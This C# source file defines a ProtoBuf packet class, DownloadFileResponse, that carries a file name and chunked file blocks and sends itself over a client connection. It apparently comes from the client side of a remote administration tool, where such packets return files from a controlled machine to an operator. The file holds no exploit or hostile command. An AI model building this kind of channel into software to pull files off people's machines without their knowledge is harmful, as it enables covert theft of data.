using ProtoBuf;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class DownloadFileResponse : IPacket
    {
        public DownloadFileResponse()
        {
        }

        public DownloadFileResponse(int id, string filename, byte[] block, int maxblocks, int currentblock,
            string custommessage)
        {
            ID = id;
            Filename = filename;
            Block = block;
            MaxBlocks = maxblocks;
            CurrentBlock = currentblock;
            CustomMessage = custommessage;
        }

        [ProtoMember(1)]
        public int ID { get; set; }

        [ProtoMember(2)]
        public string Filename { get; set; }

        [ProtoMember(3)]
        public byte[] Block { get; set; }

        [ProtoMember(4)]
        public int MaxBlocks { get; set; }

        [ProtoMember(5)]
        public int CurrentBlock { get; set; }

        [ProtoMember(6)]
        public string CustomMessage { get; set; }

        public void Execute(Client client)
        {
            client.Send<DownloadFileResponse>(this);
        }
    }
}